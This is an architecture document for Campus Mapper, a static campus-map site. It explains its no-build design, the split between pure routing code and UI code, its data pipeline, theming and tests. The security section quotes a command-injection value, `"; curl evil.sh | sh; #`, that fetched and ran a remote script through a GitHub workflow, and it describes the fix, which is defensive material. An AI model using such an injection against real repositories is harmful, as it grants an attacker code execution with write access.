# Architecture

This document explains *why* Campus Mapper is shaped the way it is. For what
the files are, see the README. For how to work on it, see CONTRIBUTING.

## A note on scope

Campus Mapper is a static site of roughly 3,000 lines with no server, no
database, and no dependencies to install. It is worth saying plainly what it is
**not**, because architecture documents attract vocabulary that doesn't fit:

- There is **no Domain-Driven Design** here. There are no bounded contexts, no
  aggregates, no ubiquitous language to codify. There are buildings, landmarks
  and paths — three record types in a JSON file.
- There is **no Hexagonal Architecture**, no ports and adapters. There is one
  adapter-shaped seam (`src/` vs `app.js`) and naming it "hexagonal" would
  imply a symmetry and a dependency-inversion discipline that does not exist.
- There is **no service layer, no repository pattern, no CQRS**. Git is the
  write model and a generated JS file is the read model, which is a joke that
  is almost true but not a pattern anyone should look for in the code.

What follows is what is *actually* here. It is a small number of decisions,
most of them forced by one constraint.

## The one constraint everything follows from

**You must be able to double-click `index.html` and have it work.**

This is not incidental. The project's audience is students at one university,
many of whom have never used npm and are making their first pull request. A
contributor who has to install Node, run `npm install`, and start a dev server
before they can see a map is a contributor who doesn't finish. The README's
claim — "Git is the backend" — is the same idea from the other end: the
contribution flow is a GitHub Issue, because that is a tool contributors
already have.

Almost every other decision is downstream of this:

| Consequence | Why |
|---|---|
| No ES modules | `<script type="module">` is blocked by CORS on `file://`. Classic scripts are not. |
| No TypeScript, no bundler | Both require a build step. |
| Modules attach to a global via a UMD-lite wrapper | The only way to share code between plain scripts *and* `require()` in Node. |
| A hand-rolled 90-line test harness | Vitest/Jest would mean `package.json`, `node_modules`, and a runner. |
| CDN dependencies rather than vendored | No install step to fetch them. This is the weakest link — see "Known tensions". |

If you are about to add a toolchain, you are proposing to trade this property
away. That might be right one day. It is a decision, not a detail.

## Functional core, imperative shell

This is the one pattern the code genuinely follows, and it is the point of the
`src/` directory.

The valuable logic in this app is arithmetic and graph search: distances,
bearings, junction snapping, Dijkstra, entry-point pairing. Originally all of
it lived inside a single 2,153-line IIFE in `app.js`, entangled with Leaflet
and a mutable `siteData` closure. That meant the algorithmic heart of the
project could not be run without a browser and a live map — and so it had no
tests at all.

The split:

```
src/geo.js      pure    no DOM, no Leaflet, no state    metersBetween, bearing, densify
src/routing.js  pure    depends only on geo.js          buildGraph, dijkstra, entry pairing
app.js          shell   owns the map, the DOM, state    wiring, rendering, event handling
```

The core takes values and returns values. `buildGraph(paths, site)` receives
paths as an argument rather than reading a closure, which is the entire
difference between "testable" and "not".

The same shape appears in the contribution pipeline, for the same reason:

```
.github/scripts/contribution-parser.js    pure    parse, validate, derive
.github/scripts/process-contribution.js   shell   read env, write files, emit outputs
```

`contribution-parser.js` is the module that decides whether untrusted input is
safe. Making it pure means the security rules can be exercised directly, with
no runner and no GitHub. Every vulnerability listed below has a test in
`tests/contribution-parser.test.js` that names it.

**Why not go further?** `app.js` is still ~1,870 lines. The remaining code is
genuinely UI: it holds a Leaflet map instance, layer groups, and a pile of
mutable drawing state that the tools mutate cooperatively. Splitting *that* is
a much riskier refactor with a much smaller payoff, and it should wait until
tests can run locally.

### Rewriting vs moving

`src/routing.js` was **moved, not rewritten**. The thresholds in it
(`JUNCTION_SNAP_METERS = 12`, `CONNECT_THRESHOLD_METERS = 45`) were hand-tuned
against this campus's real geometry. They encode knowledge that exists nowhere
else — not in a spec, not in a comment, only in the fact that the map works.

This is why `geo.metersBetween` reimplements Leaflet's spherical model exactly
rather than using a more accurate WGS84/Vincenty formula. A "better" distance
function would silently re-tune every threshold in the system and change which
paths connect. Verified bitwise-identical to Leaflet 1.9.4 across 20,000 random
pairs; the equivalence is pinned by `tests/geo.test.js` against values captured
from Leaflet itself.

The move was verified by differential testing against the original
implementation on real data: identical graphs, and 367 building pairs routed
with zero mismatches.

## Untrusted input: derive, don't trust

`.github/workflows/process-contribution.yml` triggers on `issues: opened` and
holds `contents: write` plus a `GITHUB_TOKEN`. The issue body is written by any
GitHub user on the internet. This is the highest-risk surface in the project by
a wide margin — not the app, which has no server to attack.

Two rules hold the line, and both are load-bearing:

**1. Untrusted values reach the shell only through `env:`.**

GitHub substitutes `${{ ... }}` into a `run:` block *before* the shell parses
it. The value is not a variable; it is pasted in as source code. A building
named `"; curl evil.sh | sh; #` therefore executed with repository write
access. Inside `env:`, the runner assigns the value directly and the shell only
ever sees `$ITEM_NAME`.

**2. The destination path is derived from validated parts, never read from the
issue.**

The original code assigned the issue's `**File:**` line straight to the write
target. Because JSON is also valid YAML, a contribution could overwrite a
workflow file. The field is now ignored entirely — it carried no information
that wasn't already derivable from `type`, `site` and `category`.

The general shape: **anything a contributor can influence is treated as a
claim, not a fact.** Ids, categories and sites are matched against strict
patterns; the branch name is built from a validated id rather than the free-text
name; unknown JSON keys are dropped rather than merged; names are stripped of
control characters before they can forge a `$GITHUB_OUTPUT` line.

## Data flow: one source, one generated artifact

```
data/**.json   →   node build.js   →   mapData.js   →   window.BAKED_DATA
(source of truth)                     (generated)        (what the app reads)
```

`data/` is split per-site and per-category so that the bot can append to a small
file, and so a human can find a building without scrolling through 5,000 lines.
`mapData.js` exists because the app must work from `file://`, where `fetch()` of
a local JSON file is blocked by CORS — a `<script>` assigning a global is not.
That is the whole reason for the duplication.

The duplication has a failure mode: edit one, forget the other, and the site
silently serves stale data with no error anywhere. CI therefore re-runs
`build.js` and fails if `mapData.js` moves. It is also marked
`linguist-generated` so a regenerated 4,900-line blob doesn't bury the real
change in a diff.

`parse.js` converts the original Google Earth KML export into `data/`. It is a
one-shot import tool, not part of the runtime.

## Theming

Every colour resolves through a token in `:root`. Dark is the default and the
original design; light is an override on `:root[data-theme="light"]`.

The tokens are semantic (`--panel`, `--text-dim`, `--on-accent`) rather than
literal (`--teal`), because the whole point is that the same name means the
right thing in both themes.

Two things worth knowing:

- The theme is applied by a **blocking inline script in `<head>`**, not by
  `app.js`. `app.js` loads at the end of `<body>`, so doing it there paints the
  dark theme first and repaints — a visible flash for every light-mode user.
- Contrast is **measured, not eyeballed**. The dark-theme accent `#4fb3a9` is
  ~2.4:1 on white and unusable as light-mode text. Its replacement had to clear
  4.5:1 on four different surfaces at once, including its own alpha-composited
  tint behind `.status-pill`. A plausible-looking first attempt failed two of
  them.

## Testing

`tests/` runs in Node (`node tests/run.js`) and in a browser (open
`tests/index.html`), against the same harness and the same test files. Both,
because CI has Node and a contributor might not.

The harness is deliberately ~90 lines of nothing. It is not better than Vitest;
it is compatible with having no `package.json`.

Two choices worth defending:

- **The Dijkstra is cross-checked against a brute-force Floyd-Warshall** on
  random graphs, rather than against hand-written expected distances. A
  hand-written expectation only proves the algorithm agrees with my reading of
  it. An independent shortest-path implementation actually tests it.
- **The security tests name the vulnerability they pin.** They are not there to
  raise a coverage number. If one fails, something specific and previously
  exploitable has come back.

## Known tensions

Honest list of things that are unresolved rather than solved.

**CDN dependencies.** Pinned to exact versions with SRI hashes, so a swapped
file is rejected rather than executed. But the app still cannot start without
`unpkg.com`, and the satellite tiles need `server.arcgisonline.com`. Vendoring
Leaflet into the repo would remove the CDN from the trust path and make genuine
offline use possible — at the cost of ~150KB in git and manual update chores.
For a campus map used on phones with patchy wifi, that trade may well be worth
making.

**SRI is a footgun.** Bump a version without regenerating the hash and the asset
silently stops loading. The failure looks like "the map didn't appear". It is
documented in CONTRIBUTING, which is weaker than a check.

**`app.js` is still large.** See above.

**Data format.** One JSON array per category means two concurrent
contributions to the same category conflict. One file per building, keyed by id,
would fix it. This is the project's own long-standing note and it remains right.

**No local test run without Node.** The suite is designed to run in a browser
precisely because of this, but it is a workaround.
